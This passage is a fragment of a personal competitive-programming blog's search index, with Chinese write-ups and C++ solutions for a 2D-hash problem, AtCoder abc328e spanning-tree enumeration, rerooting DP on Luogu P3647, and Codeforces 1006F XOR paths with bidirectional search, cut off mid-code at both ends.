% mod[k];</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main() &#123; </span></span><br><span class="line"><span class="comment">  int T;</span></span><br><span class="line"><span class="comment">  cin&gt;&gt;T;</span></span><br><span class="line"><span class="comment">  mod[0] = mod1;</span></span><br><span class="line"><span class="comment">  mod[1] = mod2;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  while(T--)&#123;</span></span><br><span class="line"><span class="comment">    int n,m;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);</span></span><br><span class="line"><span class="comment">    for(int i = 1;i &lt;= n;i++)&#123;</span></span><br><span class="line"><span class="comment">      scanf(&quot;%s&quot;,val[i] + 1);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    init(n,m,m,val,sums);</span></span><br><span class="line"><span class="comment">    int n1,m1;</span></span><br><span class="line"><span class="comment">    cin&gt;&gt;n1&gt;&gt;m1;</span></span><br><span class="line"><span class="comment">    for(int i = 1;i &lt;= n1;i++)&#123;</span></span><br><span class="line"><span class="comment">      scanf(&quot;%s&quot;,template_val[i] + 1);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if(n1 &gt; n || m1 &gt; m)&#123;</span></span><br><span class="line"><span class="comment">      cout&lt;&lt;0&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">      continue;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    init(n1,m1,m,template_val,sums_template);</span></span><br><span class="line"><span class="comment">    ll template_hash_val[2] = &#123;sums_template[n1][m1][0] ,sums_template[n1][m1][1]&#125;;</span></span><br><span class="line"><span class="comment">    int ans = 0;</span></span><br><span class="line"><span class="comment">    for(int i = n1;i &lt;= n;i++)&#123;</span></span><br><span class="line"><span class="comment">      for(int j = m1;j &lt;= m;j++)&#123;</span></span><br><span class="line"><span class="comment">        int pre_i = i - n1 + 1, pre_j = j - m1 + 1;</span></span><br><span class="line"><span class="comment">        int flag = 1;</span></span><br><span class="line"><span class="comment">        for(int k = 0;k &lt; 2;k++)&#123;</span></span><br><span class="line"><span class="comment">          if(template_hash_val[k] != get_hash(pre_i,pre_j,i,j,m,k))flag = 0;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        ans += flag;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;ans&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  return 0; </span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>acm,hash</tag>
      </tags>
  </entry>
  <entry>
    <title>abc328e-图中枚举树</title>
    <url>/2023/11/13/abc328e-%E5%9B%BE%E4%B8%AD%E6%9E%9A%E4%B8%BE%E6%A0%91/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p>给定一个图，节点数量<code>2&lt;=n&lt;=8</code>，边数量<code>n - 1 &lt;= m &lt;= n(n - 1) / 2</code>，求一颗树，树上的边权值对k取模后只最小。</p>
<h1 id="题解">题解</h1>
<p>这题是枚举树来做的，最开始的思路是对于每条边枚举接下来到达的点（就是枚举一个集合，集合重元素为即将达到的点），然后dfs逐个对其他点进行访问，但是这是错的，假设第一次集合中位AB两点，然后先访问A，再访问B，这样结果是不对的，因为A访问完其访问组成没有进行记录。</p>
<p>正解是这样的，通过枚举边来进行枚举树，使用并查集，但是并查集不进行路径压缩，当加边的时候，首先检查边中两个点是否在一个集合里，如果不在一个集合里则合并两个集合，被修改fa的一方需要记录一下以前的值，为了后续dfs之后的恢复，然后进行操作即可。注意一点，就是并查集在做集合合并的时候一定是集合根节点的fa进行改变，如果不是集合根节点进行改变，那么这样的修改只是将部分集合中的元素转移到了其他集合中。</p>
<figure>
<img src="-集合合并.png" alt="集合合并" />
<figcaption aria-hidden="true">集合合并</figcaption>
</figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2023 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*   filename：    E.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  22:31  2023.11.11</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">int</span> fa[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">  <span class="type">int</span> u,v;</span><br><span class="line">  ll w;</span><br><span class="line">&#125;e[<span class="number">50</span>];</span><br><span class="line">ll ans,k,n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find_f</span><span class="params">(<span class="type">int</span> posi)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(fa[posi] != posi)<span class="keyword">return</span> <span class="built_in">find_f</span>(fa[posi]);</span><br><span class="line">  <span class="keyword">return</span> posi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> cnt,ll sum)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(cnt == n - <span class="number">1</span>)&#123;</span><br><span class="line">    ans = <span class="built_in">min</span>(ans,sum);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(;i &lt; m;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">find_f</span>(e[i].u) == <span class="built_in">find_f</span>(e[i].v))<span class="keyword">continue</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="built_in">find_f</span>(e[i].u);</span><br><span class="line">    fa[t] = <span class="built_in">find_f</span>(e[i].v);</span><br><span class="line">    <span class="built_in">dfs</span>(i + <span class="number">1</span>, cnt + <span class="number">1</span>, (sum + e[i].w) % k);</span><br><span class="line">    fa[t] = t;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; n;i++)&#123;</span><br><span class="line">    fa[i] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; m;i++)&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%lld&quot;</span>,&amp;e[i].u,&amp;e[i].v,&amp;e[i].w);</span><br><span class="line">    e[i].u--;</span><br><span class="line">    e[i].v--;</span><br><span class="line">    e[i].w = e[i].w % k;</span><br><span class="line">  &#125;</span><br><span class="line">  ans = k;</span><br><span class="line">  <span class="built_in">dfs</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>图论</tag>
      </tags>
  </entry>
  <entry>
    <title>换根dp</title>
    <url>/2025/02/22/%E6%8D%A2%E6%A0%B9dp/</url>
    <content><![CDATA[<h1 id="换根dp">换根dp</h1>
<p>换根dp的基本思路是</p>
<ol type="1">
<li>先计算一棵树中所有节点的dp值。</li>
<li>将根节点a附近的节点b重新视为根，此时只有ab节点的父子关系发生了变化，其他节点的关系并不改变，依赖于父子关系的dp值只需要改变ab节点处的dp值
2.1
现将父节点a与子节点b断开，改变相应的dp值，即改变父节点a的dp值，将b的贡献去掉。
2.2 将b节点的值加上节点a的贡献，得到新的dp值，完成换根过程。</li>
<li>利用dfs过程从跟开始，不断进行换根，每次换根时间为<code>O(1)</code>，换根过程先记录原根节点与即将变换的根节点dp值，然后变换，变换后经过dfs过程后应将dp值恢复，使得下一次换根过程正确计算，可看下述代码的dfs2过程。</li>
</ol>
<p>以下为luogu的p3647连珠线</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     p3647.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  11:06  2024.05.04</span></span><br><span class="line"><span class="comment">*   modify time:  11:06  2024.05.04</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">400011</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">  <span class="type">int</span> to;</span><br><span class="line">  <span class="type">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line">ll dp[<span class="number">2</span>][maxn],head[maxn],now_edge_num,f[maxn][<span class="number">2</span>];</span><br><span class="line">Edge e[maxn &lt;&lt; <span class="number">1</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">  e[now_edge_num].length = c;</span><br><span class="line">  e[now_edge_num].to = b;</span><br><span class="line">  e[now_edge_num].next = head[a];</span><br><span class="line">  head[a] = now_edge_num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(dp,<span class="number">-1</span>,<span class="built_in">sizeof</span>(dp));</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">    f[i][<span class="number">0</span>] = <span class="number">-2e16</span>;</span><br><span class="line">    f[i][<span class="number">1</span>] = <span class="number">-2e16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> status,<span class="type">int</span> now_posi,<span class="type">int</span> fa)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_max</span><span class="params">(<span class="type">int</span> edge_id,<span class="type">int</span> now_posi)</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = head[e[edge_id].to];i != <span class="number">-1</span>;i = e[i].next)&#123;</span><br><span class="line">    num++;</span><br><span class="line">    <span class="keyword">if</span>(num &gt; <span class="number">1</span>)<span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(num == <span class="number">1</span>)&#123;</span><br><span class="line">    dp[<span class="number">0</span>][e[edge_id].to] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">dfs</span>(<span class="number">0</span>,e[edge_id].to,now_posi), <span class="built_in">dfs</span>(<span class="number">1</span>,e[edge_id].to,now_posi) + e[edge_id].length);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> status,<span class="type">int</span> now_posi,<span class="type">int</span> fa)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(dp[status][now_posi] &gt;= <span class="number">0</span>)<span class="keyword">return</span> dp[status][now_posi];</span><br><span class="line">  dp[status][now_posi] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(status == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = head[now_posi];i != <span class="number">-1</span> ;i = e[i].next)&#123;</span><br><span class="line">      <span class="keyword">if</span>(e[i].to == fa)<span class="keyword">continue</span>;</span><br><span class="line">      dp[status][now_posi] += <span class="built_in">get_max</span>(i,now_posi);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> length = <span class="number">0</span>; <span class="comment">// <span class="doctag">TODO:</span>可能值会更小</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = head[now_posi];i != <span class="number">-1</span> ;i = e[i].next)&#123;</span><br><span class="line">      <span class="type">int</span> next_posi = e[i].to;</span><br><span class="line">      <span class="keyword">if</span>(next_posi == fa)<span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">if</span>(length &lt;= e[i].length + <span class="built_in">dfs</span>(<span class="number">0</span>,next_posi,now_posi) - <span class="built_in">get_max</span>(i,now_posi))&#123;</span><br><span class="line">          length = <span class="built_in">max</span>(length,e[i].length + <span class="built_in">dfs</span>(<span class="number">0</span>,next_posi,now_posi) - <span class="built_in">get_max</span>(i,now_posi));</span><br><span class="line">          f[now_posi][<span class="number">1</span>] = f[now_posi][<span class="number">0</span>];</span><br><span class="line">          f[now_posi][<span class="number">0</span>] = length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f[now_posi][<span class="number">1</span>] &lt; e[i].length + <span class="built_in">dfs</span>(<span class="number">0</span>,next_posi,now_posi) - <span class="built_in">get_max</span>(i,now_posi))&#123;</span><br><span class="line">          f[now_posi][<span class="number">1</span>] = e[i].length + <span class="built_in">dfs</span>(<span class="number">0</span>,next_posi,now_posi) - <span class="built_in">get_max</span>(i,now_posi);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        length = e[i].length + <span class="built_in">dfs</span>(<span class="number">0</span>,next_posi,now_posi) - <span class="built_in">get_max</span>(i,now_posi);</span><br><span class="line">        f[now_posi][<span class="number">1</span>] = f[now_posi][<span class="number">0</span>];</span><br><span class="line">        f[now_posi][<span class="number">0</span>] = length;</span><br><span class="line">        flag = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[status][now_posi] = <span class="built_in">dfs</span>(<span class="number">0</span>,now_posi,fa) + length;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp[status][now_posi];</span><br><span class="line">&#125;</span><br><span class="line">ll ans;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> now_posi,<span class="type">int</span> fa,<span class="type">int</span> edge_id)</span></span>&#123;</span><br><span class="line">  <span class="comment">// 换根过程</span></span><br><span class="line">  <span class="type">int</span> temp[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">if</span>(fa != <span class="number">-1</span>)&#123;</span><br><span class="line">    temp[<span class="number">0</span>] = dp[<span class="number">0</span>][fa];</span><br><span class="line">    temp[<span class="number">1</span>] = dp[<span class="number">1</span>][fa];</span><br><span class="line">    temp[<span class="number">2</span>] = dp[<span class="number">0</span>][now_posi];</span><br><span class="line">    temp[<span class="number">3</span>] = dp[<span class="number">1</span>][now_posi];</span><br><span class="line">    temp[<span class="number">4</span>] = f[fa][<span class="number">0</span>];</span><br><span class="line">    temp[<span class="number">5</span>] = f[fa][<span class="number">1</span>];</span><br><span class="line">    temp[<span class="number">6</span>] = f[now_posi][<span class="number">0</span>];</span><br><span class="line">    temp[<span class="number">7</span>] = f[now_posi][<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">    </span><br><span class="line">    dp[<span class="number">0</span>][fa] -= <span class="built_in">get_max</span>(edge_id,fa);</span><br><span class="line">    <span class="keyword">if</span>(f[fa][<span class="number">0</span>] == e[edge_id].length + dp[<span class="number">0</span>][now_posi] - <span class="built_in">get_max</span>(edge_id,fa))&#123;   <span class="comment">// 只能使用次大</span></span><br><span class="line">      dp[<span class="number">1</span>][fa] = dp[<span class="number">0</span>][fa] + f[fa][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      dp[<span class="number">1</span>][fa] =  dp[<span class="number">0</span>][fa] + f[fa][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>][now_posi] += <span class="built_in">get_max</span>(edge_id ^ <span class="number">1</span>,now_posi);</span><br><span class="line">    <span class="keyword">if</span>(f[now_posi][<span class="number">0</span>] &lt;= e[edge_id ^ <span class="number">1</span>].length + dp[<span class="number">0</span>][fa] - <span class="built_in">get_max</span>(edge_id ^ <span class="number">1</span>, now_posi))&#123;</span><br><span class="line">      f[now_posi][<span class="number">1</span>] = f[now_posi][<span class="number">0</span>];</span><br><span class="line">      f[now_posi][<span class="number">0</span>] = e[edge_id ^ <span class="number">1</span>].length + dp[<span class="number">0</span>][fa] - <span class="built_in">get_max</span>(edge_id ^ <span class="number">1</span>, now_posi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(f[now_posi][<span class="number">1</span>] &lt;= e[edge_id ^ <span class="number">1</span>].length + dp[<span class="number">0</span>][fa] - <span class="built_in">get_max</span>(edge_id ^ <span class="number">1</span>, now_posi))&#123;</span><br><span class="line">      f[now_posi][<span class="number">1</span>] = e[edge_id ^ <span class="number">1</span>].length + dp[<span class="number">0</span>][fa] - <span class="built_in">get_max</span>(edge_id ^ <span class="number">1</span>, now_posi);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ans = <span class="built_in">max</span>(ans,dp[<span class="number">0</span>][now_posi]);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = head[now_posi]; i != <span class="number">-1</span>;i = e[i].next)&#123;    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span>(e[i].to == fa)<span class="keyword">continue</span>;</span><br><span class="line">    <span class="built_in">dfs2</span>(e[i].to,now_posi,i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(fa != <span class="number">-1</span>)&#123;</span><br><span class="line">    dp[<span class="number">0</span>][fa] = temp[<span class="number">0</span>];</span><br><span class="line">    dp[<span class="number">1</span>][fa] = temp[<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>][now_posi] = temp[<span class="number">2</span>];</span><br><span class="line">    dp[<span class="number">1</span>][now_posi] = temp[<span class="number">3</span>];</span><br><span class="line">    f[fa][<span class="number">0</span>] = temp[<span class="number">4</span>];</span><br><span class="line">    f[fa][<span class="number">1</span>] = temp[<span class="number">5</span>];</span><br><span class="line">    f[now_posi][<span class="number">0</span>] = temp[<span class="number">6</span>];</span><br><span class="line">    f[now_posi][<span class="number">1</span>] = temp[<span class="number">7</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="built_in">init</span>(n);</span><br><span class="line">  <span class="built_in">dfs</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">dfs2</span>(<span class="number">0</span>,<span class="number">-1</span>,<span class="number">-1</span>);</span><br><span class="line">  cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin&gt;&gt;n;</span><br><span class="line">  <span class="built_in">memset</span>(head,<span class="number">-1</span>,<span class="built_in">sizeof</span>(head));</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt; n;i++)&#123;</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">    a--;</span><br><span class="line">    b--;</span><br><span class="line">    <span class="built_in">add_edge</span>(a,b,c);</span><br><span class="line">    <span class="built_in">add_edge</span>(b,a,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">solve</span>(n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>dp</tag>
        <tag>换根dp</tag>
        <tag>树形dp</tag>
      </tags>
  </entry>
  <entry>
    <title>cf1606-Xor-Paths-双向搜索</title>
    <url>/2023/11/07/cf1006F-Xor-Paths-%E5%8F%8C%E5%90%91%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p>在一个$ 20 <span
class="math inline">\(的网格上，每个格子上有一些权值，选出一个从\)</span>(1,1)<span
class="math inline">\(点到\)</span>(n,m)$点的路径，这条路径满足：</p>
<ul>
<li>路径的当前点到下一个点的运动方向只能是坐标值增加的方向，即<span
class="math inline">\((i , j)\)</span>可以移动到<span
class="math inline">\((i,j+1)、(i + 1,j)\)</span></li>
<li>路径上权值异或和为k，其中<span class="math inline">\(0 \le k  \le
10^{18}\)</span></li>
</ul>
<p>现求满足条件的路径数</p>
<h1 id="题解">题解</h1>
<p>如果k值很小的话，那么一个很简单的一个dp方案就出现了 <span
class="math display">\[dp[i][j][k_1] = dp[i - 1][j][k_1 \oplus k] +
dp[i][j - 1][k \oplus k_1]\]</span>
但是观察k的取值范围，如果真的使用这个转移方程，只会导致空间开的特别大。所以这里使用stl中的map，<code>map&lt;ll,ll&gt;dp[][]</code>来完成这个转移。</p>
<p>当然到这步其实还没有完全结束，如果使用这种转移，k的数量一样会很多，我们假设每种路径的异或值都不一样，那么每个<span
class="math inline">\(dp[x][y]\)</span>中的结果存储元素个数应该是<span
class="math inline">\(C_{x + y - 2}^{x - 1}\)</span>种，$C_{20}^{10} =
$为了解决这个问题可以使用双向搜索。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2023 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*   filename：    cf1006f.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  09:37  2023.11.07</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">25</span>;</span><br><span class="line">map&lt;ll,ll&gt; dp[<span class="number">2</span>][maxx][maxx];</span><br><span class="line">ll v[maxx][maxx];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  ll k;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;v[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> split_posi = (n - <span class="number">1</span>);</span><br><span class="line">  dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>][v[<span class="number">0</span>][<span class="number">0</span>]] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(i == <span class="number">0</span> &amp;&amp; j == <span class="number">0</span> || (i + j) &gt; split_posi)<span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">if</span>(i - <span class="number">1</span> &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (map&lt;ll,ll&gt;::iterator iter = dp[<span class="number">0</span>][i - <span class="number">1</span>][j].<span class="built_in">begin</span>();iter != dp[<span class="number">0</span>][i - <span class="number">1</span>][j].<span class="built_in">end</span>(); iter++) &#123;</span><br><span class="line">          dp[<span class="number">0</span>][i][j][iter-&gt;first ^ v[i][j]] += iter-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(j - <span class="number">1</span> &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (map&lt;ll,ll&gt;::iterator iter = dp[<span class="number">0</span>][i][j - <span class="number">1</span>].<span class="built_in">begin</span>();iter != dp[<span class="number">0</span>][i][j - <span class="number">1</span>].<span class="built_in">end</span>(); iter++) &#123;</span><br><span class="line">          dp[<span class="number">0</span>][i][j][iter-&gt;first ^ v[i][j]] += iter-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(n + m - <span class="number">2</span> == split_posi)</span><br><span class="line">    dp[<span class="number">1</span>][n - <span class="number">1</span>][m - <span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    dp[<span class="number">1</span>][n - <span class="number">1</span>][m - <span class="number">1</span>][v[n - <span class="number">1</span>][m - <span class="number">1</span>]] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">      <span class="keyword">if</span>(i == n - <span class="number">1</span> &amp;&amp; j == m - <span class="number">1</span> || (i + j) &lt; split_posi)<span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">if</span>(i + <span class="number">1</span> &lt; n)&#123;</span><br><span class="line">        <span class="keyword">for</span> (map&lt;ll,ll&gt;::iterator iter = dp[<span class="number">1</span>][i + <span class="number">1</span>][j].<span class="built_in">begin</span>();iter != dp[<span class="number">1</span>][i + <span 